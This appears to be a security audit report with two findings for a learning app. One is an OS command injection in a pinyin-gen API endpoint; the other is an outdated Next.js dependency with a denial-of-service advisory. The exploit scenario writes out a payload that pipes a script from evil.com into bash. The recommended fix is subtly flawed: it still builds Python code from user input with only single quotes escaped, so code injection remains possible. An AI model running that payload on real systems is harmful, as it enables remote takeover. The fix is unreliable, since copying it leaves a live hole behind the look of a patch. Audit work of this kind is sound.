findings.title: OS Command Injection in pinyin-gen API via shell metacharacters
findings.description: User-supplied text is interpolated into a shell command string passed to execSync(). The sanitization only escapes single quotes but the command uses double-quote shell context, leaving $(), backticks, and double-quote breakout fully exploitable.
findings.exploit_scenario: 1. Attacker creates account and upgrades to PRO plan. 2. Sends POST /api/pinyin-gen with body {"text": "$(curl https://evil.com/shell.sh | bash)"}. 3. Shell interprets $() before Python launches, executing arbitrary commands with Node.js process privileges. 4. Attacker achieves blind RCE (response is swallowed by catch block but commands execute server-side).
findings.impact: Full remote code execution on the server. Attacker can read environment variables (database credentials, API keys), access the filesystem, pivot to other services, exfiltrate data.
findings.recommendation: Replace execSync() with execFileSync() which bypasses the shell entirely: execFileSync('python3', ['-c', `from pypinyin import pinyin, Style; import json; result = pinyin('${text.replace(/'/g, "\\\'")}', style=Style.TONE); print(json.dumps(result))`], { timeout: 5000, encoding: 'utf-8' })
findings.playbook: 1. Deploy fix immediately. 2. Check server logs for unusual /api/pinyin-gen requests with shell metacharacters. 3. Rotate any secrets accessible from the server environment if suspicious activity found.

findings.title: Next.js 16.2.2 has known high-severity vulnerability (GHSA-q4gf-8mx6-v5v3)
findings.description: Next.js version 16.2.2 is affected by a Server Components DoS vulnerability. Fix available in 16.2.4.
findings.exploit_scenario: 1. Attacker sends crafted requests targeting Server Components rendering path. 2. Server becomes unresponsive, denying service to legitimate users.
findings.impact: Application availability. Users cannot access the learning app during an attack.
findings.recommendation: Run: npm install next@16.2.4 (or latest patch). This is a semver-compatible update.
